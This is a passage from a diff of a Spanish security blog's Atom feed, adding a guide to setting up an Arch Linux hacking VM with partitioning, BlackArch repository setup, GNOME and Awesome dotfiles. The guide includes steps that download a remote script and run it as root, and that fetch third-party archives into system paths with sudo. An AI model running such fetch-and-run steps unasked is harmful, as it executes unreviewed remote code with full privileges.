@@ -1,4 +1,624 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.8.5">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2022-04-04T01:39:55-05:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">K4miyo | Ciberseguridad!</title><subtitle>Artículos relacinados al hacking ético en diferentes plataformas</subtitle><author><name>K4miyo</name></author><entry><title type="html">VulnHub BrainPan 1</title><link href="http://localhost:4000/vh-brainpan1/" rel="alternate" type="text/html" title="VulnHub BrainPan 1" /><published>2022-04-04T00:00:00-05:00</published><updated>2022-04-04T00:00:00-05:00</updated><id>http://localhost:4000/vh-brainpan1</id><content type="html" xml:base="http://localhost:4000/vh-brainpan1/">&lt;p&gt;&lt;img src=&quot;/assets/images/vh-brainpan1/banner-brainpan1.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.8.5">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2022-04-11T10:14:54-05:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">K4miyo | Ciberseguridad!</title><subtitle>Artículos relacinados al hacking ético en diferentes plataformas</subtitle><author><name>K4miyo</name></author><entry><title type="html">Entorno Arch Linux</title><link href="http://localhost:4000/entorno_arch/" rel="alternate" type="text/html" title="Entorno Arch Linux" /><published>2022-04-11T00:00:00-05:00</published><updated>2022-04-11T00:00:00-05:00</updated><id>http://localhost:4000/entorno_arch</id><content type="html" xml:base="http://localhost:4000/entorno_arch/">&lt;p&gt;&lt;img src=&quot;/assets/images/entorno_arch/banner-arch.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;h1 id=&quot;entorno-arch-linux&quot;&gt;Entorno Arch Linux&lt;/h1&gt;
+
+&lt;p&gt;A continuación se presenta la configuración de un entorno de hacking en &lt;strong&gt;Arch Linux&lt;/strong&gt; de acuerdo con el video de &lt;a href=&quot;https://www.youtube.com/watch?v=fshLf6u8B-w&quot;&gt;YouTube de S4vitar&lt;/a&gt;. Primero, comenzaremos con al descarga de la ISO de &lt;a href=&quot;https://archlinux.org/download/&quot;&gt;&lt;strong&gt;Arch Linux&lt;/strong&gt;&lt;/a&gt;.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/entorno_arch/arch1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;configuración-de-la-máquina-virtual&quot;&gt;Configuración de la máquina virtual&lt;/h2&gt;
+
+&lt;p&gt;Una vez descargada la ISO, vamos a proceder a crear una máquina vírtual con la herramienta VMware WorkStation en la opción &lt;strong&gt;File &amp;gt; New Virtual Machine…&lt;/strong&gt; y de la ventanita seleccionamos las siguientes opciones:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Seleccionamos &lt;em&gt;Typical (recommended)&lt;/em&gt;&lt;/li&gt;
+  &lt;li&gt;Seleccionamos &lt;em&gt;Installer disc image file (iso)&lt;/em&gt; y colocamos el archivo ISO que descargamos.&lt;/li&gt;
+  &lt;li&gt;Seleccionamos &lt;em&gt;Linux&lt;/em&gt; y de versión &lt;em&gt;Debian 10.x 64 bit&lt;/em&gt; (en caso de que nuestra máquina sea de x64).&lt;/li&gt;
+  &lt;li&gt;Colocamos un nombre que queramos y la ruta donde se guardará nuestra máquina virtual.&lt;/li&gt;
+  &lt;li&gt;Ahora el tamaño del disco seleccionamos el que nosotros queramos con un mínimo de 20 GB y la opción &lt;em&gt;Store virtual disk as a single file&lt;/em&gt;.&lt;/li&gt;
+  &lt;li&gt;Seleccionamos &lt;em&gt;Customize Hardware…&lt;/em&gt; y la parte de &lt;em&gt;Network Adapter&lt;/em&gt; ponemos la opción &lt;em&gt;Bridged: Connected directly to the physical network&lt;/em&gt;.&lt;/li&gt;
+  &lt;li&gt;Seleccionamos &lt;em&gt;Memory&lt;/em&gt; y le asignamos 4 GB y en &lt;em&gt;¨Processors&lt;/em&gt; colocamos 2.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Ejecutamos la máquina virutal y seleccionamos &lt;em&gt;Arch Linux install medium (x86_64, BIOS)&lt;/em&gt;, la primera opción.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/entorno_arch/arch2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Al terminar el proceso, nos arroja una linea de comandos como &lt;strong&gt;root&lt;/strong&gt; en la cual primero vamos a validar si tenemos conexión a internet con una traza ICMP (&lt;strong&gt;Nota&lt;/strong&gt;: El teclado lo tendremos en configuración en-US, por lo que si lo queremos en español utilizaremos el comando &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;loadkeys es&lt;/code&gt;):&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@archiso ~ &lt;span class=&quot;c&quot;&gt;# ping -c 1 8.8.8.8&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;configuracón-de-las-particiones&quot;&gt;Configuracón de las particiones&lt;/h2&gt;
+
+&lt;p&gt;Ahora escribimos el comando &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cfdisk&lt;/code&gt; y nos arrojará un panel de opción; como nos encontramos en máquina virtual, seleccioamos &lt;strong&gt;dos&lt;/strong&gt;. Nos toca crear las particiones de nuestro sistema, por lo tanto, en la parte de abajo seleccionamos &lt;strong&gt;New&lt;/strong&gt; y&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;La primera partición le asignaremos un espacio de &lt;strong&gt;512M&lt;/strong&gt; y seleccionamos &lt;strong&gt;primary&lt;/strong&gt;.&lt;/li&gt;
+  &lt;li&gt;Nos colocamos en &lt;strong&gt;Free space&lt;/strong&gt; y la segunda partición le asignaremos un espacio de &lt;strong&gt;15G&lt;/strong&gt;  y seleccionamos &lt;strong&gt;primary&lt;/strong&gt;.&lt;/li&gt;
+  &lt;li&gt;Nos colocamos nuevamente en &lt;strong&gt;Free space&lt;/strong&gt; y la tercera partición le asignaremos el resto (&lt;strong&gt;4.5G&lt;/strong&gt;) y seleccionamos &lt;strong&gt;primary&lt;/strong&gt;.&lt;/li&gt;
+  &lt;li&gt;Ahora si seleccionamos &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/dev/sda3&lt;/code&gt; (la partición de 4.5G), en la opción de bajo eligimos &lt;strong&gt;Type&lt;/strong&gt; y ponemos &lt;strong&gt;82 Linux swap / Solaris&lt;/strong&gt;&lt;/li&gt;
+  &lt;li&gt;Por último, del menú de abajo le damos a &lt;strong&gt;Write&lt;/strong&gt; y confirmamos y posteriormente le damos a &lt;strong&gt;Quit&lt;/strong&gt;.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Con el comando &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;lsblk&lt;/code&gt; podemos ver las particiones que hemos creado.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/entorno_arch/arch3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Ahora vamos a darle formato a las particiones que tenemos con &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mkfs.vfat -F 32 /dev/sda1&lt;/code&gt; para la partición de 512M, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mkfs.ext4 /dev/sda2&lt;/code&gt; para la partición de 15G y &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mkswap /dev/sda3&lt;/code&gt; para la partición de 4.5G y aplicamos los cambios &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;swapon&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;Posterior a esto, vamos a montar lo que hay en &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/dev/sda2&lt;/code&gt; en &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/mnt&lt;/code&gt; con el comando &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mount /dev/sda2 /mnt&lt;/code&gt;, creamos el directorio &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;boot&lt;/code&gt; con &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mkdir /mnt/boot&lt;/code&gt; y montamos lo que hay en &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/dev/sda1&lt;/code&gt; en el directorio que creamos con &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mount /dev/sda1 /mnt/boot&lt;/code&gt;. Con esto, podemos procede a instalar los paquetes necesarios:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;pacstrap /mnt linux linux-firmware networkmanager grub wpa_supplicant base base-devel
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Esperamos que se instalen lo paquetes que hemos definido sin errores. Ahora ejecutamos el comando &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;genfstab -U /mnt &amp;gt; /mnt/etc/fstab&lt;/code&gt; vamos a generar un archivo que contenga la información relacionada a las particiones del sistema y lo validamos con &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cat /mnt/etc/fstab&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;Posterior a esto, vamos a cambiar la contraseña del usuario &lt;strong&gt;root&lt;/strong&gt; y generar un usuario; por lo tanto, primero ejecutamos &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;arch-chroot /mnt&lt;/code&gt; para ingresar a lo que va a ser nuestro sistema y definimos la contraseña de &lt;strong&gt;root&lt;/strong&gt; con &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;passwd&lt;/code&gt;. Ahora creamos el usuario que queramos, para este caso &lt;strong&gt;k4miyo&lt;/strong&gt; con &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;useradd -m k4miyo&lt;/code&gt; y también le generamos una contraseña con &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;passwd k4miyo&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;El usuario que hemos creado lo agregamos al grupo &lt;strong&gt;wheel&lt;/strong&gt; con &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;usermod -aG wheel k4miyo&lt;/code&gt; y lo validamos con &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;groups k4miyo&lt;/code&gt;. Instalamos los paquetes &lt;strong&gt;sudo&lt;/strong&gt;, &lt;strong&gt;vim&lt;/strong&gt; y &lt;strong&gt;nano&lt;/strong&gt; con &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pacman -S sudo vim nano&lt;/code&gt;, abrimos el &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/sudoers&lt;/code&gt; con &lt;strong&gt;nano&lt;/strong&gt; o &lt;strong&gt;vim&lt;/strong&gt; y buscando por &lt;strong&gt;wheel&lt;/strong&gt; descomentamos la linea &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;%wheel ALL=(ALL:ALL) ALL&lt;/code&gt;; guardamos cambios y cerramos. Lo anterior lo hicimos para que cuando del usuario &lt;strong&gt;k4miyo&lt;/strong&gt; hacemos un &lt;strong&gt;sudo su&lt;/strong&gt;, se nos solicite una contraseña para poder operar como &lt;strong&gt;root&lt;/strong&gt;.&lt;/p&gt;
+
+&lt;p&gt;Vamos a retocar un poco las regiones con &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nano /etc/locale.gen&lt;/code&gt; y descomentamos &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;en_US.UTF-8 UTF-8&lt;/code&gt; y &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;es_XX.UTF-8 UTF-8&lt;/code&gt;; en donde XX se refiere a la región donde nos encontremos. Guardamos, salimos y aplicamos un &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;locale-gen&lt;/code&gt;. Para que nos tome siempre nuestro teclado y no andar cambiando, vamos a crear con &lt;strong&gt;nano&lt;/strong&gt; el archivo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nano /etc/vconsole.conf&lt;/code&gt; y le agregamos &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;KEYMAP=es&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;Proseguimos con la instalación del &lt;strong&gt;bootloader&lt;/strong&gt; con &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;grub-install /dev/sda&lt;/code&gt; y generamos el archivo de configuración con &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;grub-mkconfig -o /boot/grub/grub.cfg&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;Si queremos definir el nombre de nuestro equipo, vamos a ejecutar &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;echo k4mi4rch &amp;gt; /etc/hostname&lt;/code&gt; y ahora retocamos el &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/hosts&lt;/code&gt; agregando las siguientes linea:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;127.0.0.1 	localhost
+::1 		localhost
+127.0.0.1 	k4mi4rch.localhost k4mi4rch
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Y para presumir que tenemos instalado &lt;strong&gt;Arch Linux&lt;/strong&gt;, vamos a instalar &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;neofetch&lt;/code&gt; con &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pacman -S neofetch&lt;/code&gt;; que una vez instalado, al ejecutar el comando &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;neofetch&lt;/code&gt;, nos aparece el logo de &lt;strong&gt;Arch&lt;/strong&gt;. Para finalizar, ejecutamos un &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;exit&lt;/code&gt; y &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;reboot now&lt;/code&gt;.&lt;/p&gt;
+
+&lt;h2 id=&quot;salida-a-internet&quot;&gt;Salida a internet&lt;/h2&gt;
+
+&lt;p&gt;Ya tenemos nuestro sistema pero sin interfaz gráfica todavía, por lo que nos logueamos como el usuario que definimos y vamos a ver que no tenemos salida a internet; por lo tanto ejecutamos &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sudo systemctl start NetworkMaanger.service&lt;/code&gt; y &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sudo systemctl enable NetworkMaanger.service&lt;/code&gt;; con esto ya contamos con salida a internet. También vamos a hacer lo mismo para el servicio &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;wpa_supplicant&lt;/code&gt; con los comandos &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sudo systemctl start wpa_supplicant.service&lt;/code&gt; y &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sudo systemctl enable wpa_supplicant.service&lt;/code&gt;.&lt;/p&gt;
+
+&lt;h2 id=&quot;aur-y-blackarch&quot;&gt;AUR y BlackArch&lt;/h2&gt;
+
+&lt;p&gt;Para tener más alcance a los recursos que podemos instalar, vamos a agregar &lt;strong&gt;AUR&lt;/strong&gt; que es un repositorio de &lt;strong&gt;Arch&lt;/strong&gt;; por lo tanto, primero instalamos &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;git&lt;/code&gt; con &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sudo pacman -S git&lt;/code&gt;. Ahora, como el usuario no privilegiado, nos dirigimos a nuestro directorio asignado y dentro de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Desktop&lt;/code&gt; creamos una carpeta llamada &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;repos&lt;/code&gt;, que será en donde tengamos los repositorios que queramos descargar &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cd; mkdir -p Desktop/repos; cd !$&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;Una vez dentro de dicha carpeta, nos descargamos &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;paru&lt;/code&gt; con &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;git clone https://aur.archlinux.org/paru-bin.git&lt;/code&gt;, nos metemos en el directorio &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;paru-bin&lt;/code&gt; y procedemos a instalarlo con &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;makepkg -si&lt;/code&gt;; si nos pide contraseña, se la proporcionamos y le damos enter.&lt;/p&gt;
+
+&lt;p&gt;Ahora vamos a crear el directorio &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/home/k4miyo/Desktop/repos/blackarch&lt;/code&gt; y nos descargaremos un script en bash &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;curl -O https://blackarch.org/strap.sh&lt;/code&gt;, le damos permisos de ejecución con &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;chmod +x strap.sh&lt;/code&gt; y ejecutamos el script como el usuario &lt;strong&gt;root&lt;/strong&gt;. Para validar los repos y/o bases de datos a las que tenemos acceso, lo hacemos con el comando &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sudo pacman -Sy&lt;/code&gt;. Con esto, podemos instalarnos múltiples paquetes, como por ejemplo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;impacket&lt;/code&gt; con &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sudo pacman -S impacket&lt;/code&gt;. Para buscar los paquetes que podemos instalar, lo hacemos con  &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sudo pacman -Sgg | grep blackarch&lt;/code&gt;.&lt;/p&gt;
+
+&lt;h2 id=&quot;interfaz-gráfica&quot;&gt;Interfaz gráfica&lt;/h2&gt;
+
+&lt;p&gt;Para la interfaz gráfica, vamos a instalar &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;xorg&lt;/code&gt; con &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sudo pacman -S xorg xorg-server&lt;/code&gt;, posteriormente &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;gnome&lt;/code&gt; con &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sudo pacman -S gnome&lt;/code&gt;. Antes de habilitar y arrancar la interfaz gráfica, vamos a instalar &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;kitty&lt;/code&gt; con &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sudo pacman -S kitty&lt;/code&gt;. Ahora ejecutamos &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sudo systemctl enable gdm.service&lt;/code&gt; y &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sudo systemctl start gdm.service&lt;/code&gt; y con esto ya contamos con una interfaz gráfica; por lo tanto aplicamos un &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;reboot now&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;Una vez que ingresamos a nuestra máquina, vemos que el teclado está en inglés; por lo que si queremos cambiar, lo haremos de manera manuel dentro del sistema y buscando &lt;strong&gt;Keyboard&lt;/strong&gt; y agregando nuestro idioma para el teclado. Si presionamos &lt;strong&gt;Ctrl + Alt + F3&lt;/strong&gt;, nos abre la consola y con &lt;strong&gt;Ctrl + Alt + F2&lt;/strong&gt; regresamos a la interfaz gráfica. En modo consola, instalamos &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;gtkmm&lt;/code&gt; con &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sudo pacman -S gtkmm&lt;/code&gt; y en caso de que estemos utilizando VMware, instalaremos &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sudo pacman -S open-vm-tools xf86-video-vmware xf86-input-vmmouse&lt;/code&gt; y habilitamos el demonio con &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sudo systemctl enable vmtoolsd&lt;/code&gt;. Con esto, ya podemos volver a reiniciar la máquina con &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sudo reboot now&lt;/code&gt;. Con esto ya tenemos la máquina instalada, ahora nos falta personalizarla, por lo que antes vamos a realizar un &lt;strong&gt;Snapshot&lt;/strong&gt; por cualquier cosa que nos llegue a pasar a continuación.&lt;/p&gt;
+
+&lt;h2 id=&quot;personalización&quot;&gt;Personalización&lt;/h2&gt;
+
+&lt;h3 id=&quot;awesome&quot;&gt;Awesome&lt;/h3&gt;
+
+&lt;p&gt;Nos abrimos una &lt;strong&gt;kitty&lt;/strong&gt; e instalamos firefox con &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sudo pacman -S firefox&lt;/code&gt; y nos dirigimos al repositorio &lt;a href=&quot;https://github.com/rxyhn/dotfiles&quot;&gt;Awesome&lt;/a&gt;, vamos a la parte de &lt;strong&gt;Setup&lt;/strong&gt; e instalamos lo que nos indica como un usuario no privilegiado:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;paru &lt;span class=&quot;nt&quot;&gt;-S&lt;/span&gt; awesome-git picom-git alacritty rofi todo-bin acpi acpid &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+wireless_tools jq inotify-tools polkit-gnome xdotool xclip maim &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+brightnessctl alsa-utils alsa-tools pulseaudio lm_sensors &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+mpd mpc mpdris2 ncmpcpp playerctl &lt;span class=&quot;nt&quot;&gt;--needed&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Ahora ejecutamos lo siguiente:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;systemctl &lt;span class=&quot;nt&quot;&gt;--user&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;enable &lt;/span&gt;mpd.service
+systemctl &lt;span class=&quot;nt&quot;&gt;--user&lt;/span&gt; start mpd.service
+&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;systemctl &lt;span class=&quot;nb&quot;&gt;enable &lt;/span&gt;acpid.service
+&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;systemctl start acpid.service
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Vamos a instalar las fuentes, de acuerdo con al autor del repositorio y vamos a agregar algunas más; por lo que primero nos instalamos &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;wget&lt;/code&gt; con &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sudo pacman -S wget&lt;/code&gt;, nos dirigimos a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cd /usr/share/fonts&lt;/code&gt; y descargamos el un recurso con &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sudo wget http://fontlot.com/downfile/5baeb08d06494fc84dbe36210f6f0ad5.105610&lt;/code&gt;. Renombramos el archivo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;5baeb08d06494fc84dbe36210f6f0ad5.105610&lt;/code&gt; por uno más corto como &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;comprimido.zip&lt;/code&gt; con &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sudo mv 5baeb08d06494fc84dbe36210f6f0ad5.105610 comprimido.zip&lt;/code&gt;, descomprimimos el archivo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sudo unzip comprimido.zip&lt;/code&gt;, borramos el comprimido &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sudo rm comprimido.zip&lt;/code&gt; y ahora vamos a hacer un filtrado de los archivos que nos interesan. (&lt;strong&gt;Nota&lt;/strong&gt;: Si quieren pueden descomprimir con 7z instalando el paquete con &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sudo pacman -S p7zip&lt;/code&gt;)&lt;/p&gt;
+
+&lt;p&gt;Dentro de la ruta &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/usr/share/fonts&lt;/code&gt; ejecutamos lo siguiente:&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;find &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\.&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;ttf$&quot;&lt;/span&gt; | &lt;span class=&quot;k&quot;&gt;while &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;read &lt;/span&gt;line&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;do &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo cp&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$line&lt;/span&gt; .&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;done
+&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo rm&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-r&lt;/span&gt; iosevka-2.2.1/
+&lt;span class=&quot;nb&quot;&gt;sudo rm&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-r&lt;/span&gt; iosevka-slab-2.2.1/
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Ahora nos descargamos &lt;strong&gt;icomoon.zip&lt;/strong&gt; de &lt;a href=&quot;https://dropbox.com/s/hrkub2yo9iapljz/icomoon.zip?=0&quot;&gt;Dropbox&lt;/a&gt; y movemos el contenido en la carpeta en la que nos encontramos &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/usr/share/fonts&lt;/code&gt;:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;sudo mv&lt;/span&gt; /home/k4miyo/Downloads/icomoon.zip &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;unzip icomoon.zip
+&lt;span class=&quot;nb&quot;&gt;sudo rm &lt;/span&gt;icomoon.zip
+&lt;span class=&quot;nb&quot;&gt;sudo mv &lt;/span&gt;icomoon/&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;.ttf &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;sudo rm&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-rf&lt;/span&gt; icomoon/
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Como un usuario no privilegiado instalamos las fuentes que nos hacen falta:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;paru &lt;span class=&quot;nt&quot;&gt;-S&lt;/span&gt; nerd-fonts-jetbrains-mono ttf-font-awesome ttf-font-awesome-4 ttf-material-design-icons
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;De acuerdo con el autor del repositorio, nos descargamos la repo y copiamos los archivos de configuración:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; /home/k4miyo/Desktop/repos/
+git clone https://github.com/rxyhn/dotfiles.git
+&lt;span class=&quot;nb&quot;&gt;cd &lt;/span&gt;dotfiles
+&lt;span class=&quot;nb&quot;&gt;cp&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-r&lt;/span&gt; config/&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; ~/.config/
+&lt;span class=&quot;nb&quot;&gt;mkdir&lt;/span&gt; ~/.local/bin/
